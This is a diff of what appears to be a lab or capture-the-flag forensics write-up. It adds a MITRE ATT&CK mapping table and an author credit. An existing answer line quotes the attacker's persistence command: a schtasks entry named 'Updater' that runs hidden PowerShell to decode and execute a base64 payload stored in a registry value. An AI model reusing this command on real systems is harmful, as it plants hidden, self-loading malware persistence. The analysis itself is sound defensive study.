@@ -190,4 +190,25 @@ Searching using keywords that are related to scheduled task.Command → strings 
 
 Answer: schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"’
 
-### Done By Ruthran-sec
+# MITRE ATT&CK Mapping
+
+| ATT&CK Stage | Technique ID | Technique |
+| --- | --- | --- |
+| Reconnaissance | T1598.002 | **Phishing for Information: Spearphishing Attachment** |
+| Resource Development | T1588.001 | **Obtain Capabilities: Malware** |
+| Initial Access | T1566.001 | **Phishing: Spearphishing Attachment** |
+| Execution | T1204.002 | **User Execution: Malicious File** |
+| Persistence | T1053.005 | **Scheduled Task/Job: Scheduled Task** |
+| Privilege Escalation | T1053.005 | **Scheduled Task/Job: Scheduled Task** |
+| Defense Impairment | T1140 | **Deobfuscate/Decode Files or Information** |
+| Credential Access | - | - |
+| Discovery | T1082 | **System Information Discovery** |
+| Lateral Movement | - | - |
+| Collection | T1005 | **Data from Local System** |
+| Command and Control | T1105 | **Ingress Tool Transfer** |
+| Exfiltration | - | - |
+| Impact | - | - |
+
+## Done By
+
+### RUTHRAN-SEC
